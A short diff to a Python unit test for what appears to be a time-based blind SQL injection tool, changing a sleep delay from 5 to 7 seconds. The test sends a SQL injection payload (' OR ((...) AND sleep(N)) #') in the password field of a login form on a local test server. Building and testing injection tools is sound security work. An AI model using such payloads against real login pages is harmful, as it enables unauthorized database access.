@@ -12,7 +12,7 @@ class TestCalibrateTimeBasedBlindStringFinder(TestCase):
     def setUp(self):
         self.tester = TimeBlindTester(
             lambda payload: requests.post('http://127.0.0.1:8181/login.php', data={'login': 'admin',
-                                                                                   'pass': "' OR ( ({}) AND sleep(5) ) #".format(
+                                                                                   'pass': "' OR ( ({}) AND sleep(7) ) #".format(
                                                                                        payload)}),
         )
 
